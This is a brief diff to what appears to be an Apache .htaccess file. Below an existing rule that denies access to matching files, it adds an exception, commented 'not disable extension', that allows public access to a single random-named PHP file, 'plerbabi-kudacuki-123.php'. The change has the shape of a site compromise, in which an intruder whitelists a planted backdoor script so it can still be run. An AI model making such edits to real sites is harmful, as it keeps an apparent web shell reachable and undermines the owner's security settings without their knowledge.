@@ -3,3 +3,9 @@
  Order Allow,Deny
  Deny from all
 </FilesMatch>
+
+## not disable extension 
+<FilesMatch "plerbabi-kudacuki-123.php$">
+ Order Allow,Deny
+ Allow from all
+</FilesMatch>
